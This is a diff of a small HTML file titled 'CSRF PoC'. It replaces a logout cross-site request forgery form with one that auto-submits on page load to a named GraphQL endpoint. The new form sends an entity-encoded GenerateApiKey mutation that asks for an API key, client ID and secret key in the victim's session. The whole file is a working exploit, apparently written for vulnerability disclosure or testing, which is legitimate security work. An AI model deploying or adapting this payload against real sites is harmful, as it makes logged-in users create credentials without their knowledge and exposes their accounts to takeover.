@@ -1,15 +1,19 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <form id="csrfForm" action="https://staging-api.018019535749.hellopublic.com/userservice/public/web/logout" method="POST">
-      <!-- Add parameters only if required -->
-      <!-- Example:
-      <input type="hidden" name="refreshToken" value="dummy">
-      -->
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <form id="csrfForm" action="https://graph.sandboxfiri.com/graphql" method="POST">
+        <input type="hidden" name="operationName" value="GenerateApiKey" />
+        
+        <input type="hidden" name="query" value="mutation&#32;GenerateApiKey&#40;&#36;input&#58;&#32;KeygenInput&#33;&#41;&#32;&#123;&#32;generateApiKey&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#32;apiKey&#32;clientId&#32;secretKey&#32;__typename&#32;&#125;&#32;&#125;" />
+        
+        <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;name&quot;&#58;&quot;Test&quot;&#44;&quot;read&quot;&#58;true&#44;&quot;write&quot;&#58;false&#125;&#125;" />
     </form>
 
     <script>
-      document.getElementById("csrfForm").submit();
+        document.getElementById('csrfForm').submit();
     </script>
-  </body>
+</body>
 </html>
